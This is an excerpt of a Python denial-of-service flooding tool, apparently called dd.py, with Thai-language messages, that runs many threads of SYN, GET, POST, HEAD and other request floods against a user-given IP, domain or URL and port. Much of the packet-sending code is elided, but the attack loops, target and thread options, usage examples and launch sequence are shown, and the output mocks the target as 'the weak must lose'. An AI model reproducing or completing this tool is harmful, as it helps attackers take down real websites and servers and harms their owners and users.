    ...
    while True:
        try:
            ...
            s.close()
                   ...
                   print("["+yl+"!"+wi+"] "+yl+"SYN-ATTACK:"+wi+" ไม่สามารถเชื่อมต่อกับเป้าหมายได้ ["+rd+target+wi+"]"+yl+" อาจจะ "+rd+"Down\n"+wi, end='\r')
                   if isKilled():break
...
def get_attack():
         ...
         while True:
             try:
                    ...
                    print("["+yl+"!"+wi+"] "+yl+"โจมตี:"+wi+" ไม่สามารถเชื่อมต่อกับเป้าหมายได้ ["+rd+target+wi+"]"+yl+" อาจจะ "+rd+"Down\n"+wi, end='\r')
                    if hasattr(err, 'errno'):
                        if err.errno ==24:break
                    if isKilled():break
                    continue
...
def post_attack():
    ...
    while True:
        try:
            ...
            print("["+yl+"!"+wi+"] "+yl+"POST-ATTACK:"+wi+" ไม่สามารถเชื่อมต่อกับเป้าหมายได้ ["+rd+target+wi+"]"+yl+" Maybe "+rd+"Down\n"+wi, end='\r')
            if hasattr(err, 'errno'):
                if err.errno ==24:break
            if isKilled():break
            continue
...
def request_get_attack():
    ...
    while True:
        try:
            ...
            print("["+yl+"!"+wi+"] "+yl+"REQUEST-GET-ATTACK:"+wi+" ไม่สามารถเชื่อมต่อกับเป้าหมายได้ ["+rd+target+wi+"]"+yl+" อาจจะ "+rd+"Down\n"+wi, end='\r')
            if hasattr(err, 'errno'):
                if err.errno == 24: break
            if isKilled(): break
            continue
...
def request_post_attack():
    ...
    while True:
        try:
            ...
            print("["+yl+"!"+wi+"] "+yl+"REQUEST-POST-ATTACK:"+wi+" ไม่สามารถเชื่อมต่อกับเป้าหมายได้ ["+rd+target+wi+"]"+yl+" อาจจะ "+rd+"Down\n"+wi, end='\r')
            if hasattr(err, 'errno'):
                if err.errno == 24: break
            if isKilled(): break
            continue
...
def head_attack():
    ...
    while True:
        try:
            ...
            print("["+yl+"!"+wi+"] "+yl+"HEAD-ATTACK:"+wi+" ไม่สามารถเชื่อมต่อกับเป้าหมายได้ ["+rd+target+wi+"]"+yl+" อาจจะ "+rd+"Down\n"+wi, end='\r')
            if hasattr(err, 'errno'):
                if err.errno == 24: break
            if isKilled(): break
            continue
...
def quit(sig,fream):
    print(rd+"\n["+yl+"!"+rd+"]"+yl+"ผู้ใช้ใจอ่อน... "+rd+"..."+wi)
    time.sleep(1)
    if started:
       print(rd+"  ["+yl+"~"+rd+"]"+yl+" ล้มเลิก ภารกิจ..."+rd+"..."+wi)
       kill()
       time.sleep(2.5)
    print(wi+"\n["+gr+"*"+wi+"] อ่อนแอ ก็ต้องแพ้ไป :)")
    if started:
        print("["+gr+"*"+wi+"] หวังว่า คุณจะใช้มัน โดยมีสติ #กราบ"+yl+"!?"+wi)
    sys.exit(0)

signal.signal(signal.SIGINT, quit)
signal.signal(signal.SIGTERM,quit)
print ("\033[1;40mDEV : PNCKDEVAPP\033[1;40m ")
parse = optparse.OptionParser(usage='''
คำสั่ง: python3 dd.py [คำสั่ง]
-------------
OPTIONS:
       |
    |--------
    | -s <เป้าหมาย_(IP,domain,url)>                  ::> ระบุ IP เป้าหมาย หรือ โดเมน หรือ URL (**จำเป็น**)
    |--------
    | -p <เป้าหมาย_port>                             ::> ระบุหมายเลขพอร์ตเป้าหมาย ค่าเริ่มต้น (443) https (ไม่บังคับ)
    |--------
    | -t <threads_number>                          ::> ระบุจำนวน threads ค่าเริ่มต้น (135) (ไม่บังคับ)
    |--------
    | -a <attack_type_(GET,POST,HEAD,TCP,UDP)>     ::> ประเภทของการ GET,POST,HEAD,TCP,UDP (ไม่บังคับ)
-------------
ตัวอย่าง :
        |
     |--------
     | python3 dd.py -s 192.168.1.1
     |--------
     | python3 dd.py -s mydomain.com -p 443
     |--------
     | python3 dd.py -s 192.168.0.22 -p 22 -t 500 -a tcp
''', add_help_option = False, version='DD version 1.0')
...
if not any(opt for opt in opts):
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n"+wi)
    while True:
        target = str(input(f"เป้าหมาย [?]: ")).strip()
        if target:
            print("-----------"+"-"*len(target))
    ...
    print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n")
    while True:
            port = str(input("PORT [httpsใช้(443)]: ")).strip()
            if port and not port.isdigit() or port.isdigit() and not 0 <= int(port) <= 65535:
                print(rd+"["+yl+"!"+rd+"]"+yl+" ข้อผิดพลาด: เลือกหมายเลขพอร์ตไม่ถูกต้อง "+rd+" !!!")
                sys.exit(1)
            else:
                if not port:
                    port = 80
    ...
    while True:
            ...
            if not threads:
                ...
                if not threads.isdigit() or int(threads) <=0:
                    print(rd+"["+yl+"!"+rd+"]"+yl+"ข้อผิดพลาด: เลือกหมายเลขเธรดไม่ถูกต้อง "+rd+" !!!"+wi)
                    sys.exit(1)
                threads = int(threads)
    ...
    while True:
            ...
            if attack and attack not in attacks:
                    print(rd+"["+yl+"!"+rd+"]"+yl+"ข้อผิดพลาด: เลือกประเภทการโจมตีที่ไม่ถูกต้อง "+rd+" !!!"+wi)
                    sys.exit(1)
    ...
    if target:
       ...
       print(rd+"["+yl+"!"+rd+"]"+yl+"ข้อผิดพลาด: โปรดเลือกเป้าหมายก่อนเพราะจำเป็น "+rd+" !!!"+wi)
       sys.exit(1)
print(wi+"["+yl+"~"+wi+"] ตรวจสอบการเชื่อมต่ออินเทอร์เน็ต [...]", end='\r')
time.sleep(2)
if not cnet():
    print("["+rd+"-"+wi+"]ตรวจสอบการเชื่อมต่ออินเทอร์เน็ต["+rd+"Fail"+wi+"]\n", end='\r')
    print("  ["+rd+"!"+wi+"]"+yl+" Please Check Your Internet Connection And Try Again "+rd+"!!!"+wi)
    sys.exit(1)
print("["+gr+"+"+wi+"]ตรวจสอบการเชื่อมต่ออินเทอร์เน็ต["+gr+"Connected"+wi+"]\n", end='\r')
...
print(wi + "[" + yl + "~" + wi + f"] ตรวจสอบการเชื่อมต่อกับเป้าหมาย " + gr + f"{target}" + wi + ":" + rd + f"{port}" + wi + " [...]", end='\r')
time.sleep(2)
if not cnet(target,port):
    print("["+rd+"-"+wi+"] ตรวจสอบการเชื่อมต่อกับเป้าหมาย "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+rd+"Fail"+wi+"]\n", end='\r')
    print(rd+"  ["+yl+"!"+rd+"]"+yl+" ข้อผิดพลาด: ไม่สามารถเชื่อมต่อกับเป้าหมาย On "+rd+f"{target}"+yl+":"+rd+f"{port}"+yl+" !!!\n"+wi)
    sys.exit(1)

print("["+gr+"+"+wi+"]"+wi+f" ตรวจสอบการเชื่อมต่อกับเป้าหมาย "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+gr+" เชื่อมต่อแล้ว "+wi+"]\n", end='\r')
print(wi+"["+yl+"~"+wi+"] เริ่มต้น "+gr+f"{threads}"+wi+" Threads [...]", end='\r')
THREADS = list()
event = threading.Event()
kill = lambda: event.set()
isKilled = lambda: event.isSet()
time.sleep(1.5)
print("["+gr+"+"+wi+"] เริ่มต้น "+gr+f"{threads}"+wi+" Threads ["+gr+"DONE"+wi+"]\n",end='\r')
time.sleep(1.5)
os.system("cls || clear")
print ("\033[1;40mDEV : PNCKDEVAPP\033[1;40m ")
print(wi+"["+gr+"*"+wi+"]"+yl+"-=-=-=-=-=-=-= "+gr+" การโจมตีได้เริ่มขึ้นแล้ว ("+yl+f"{target}:{port}"+gr+")"+yl+" -=-=-=-=-=-=-="+wi+"["+gr+"*"+wi+"]")
print("["+yl+"I"+wi+"] โจมตีโดยใช้ ["+yl+attack.upper()+wi+" ] ตามเป้าหมาย...")
print("["+yl+"I"+wi+"] พิมพ์ "+gr+"' Ctrl+C ' "+wi+" เพื่อหยุดการโจมตี อ่อนแอก็ต้องแพ้ไป ")
time.sleep(1.5)
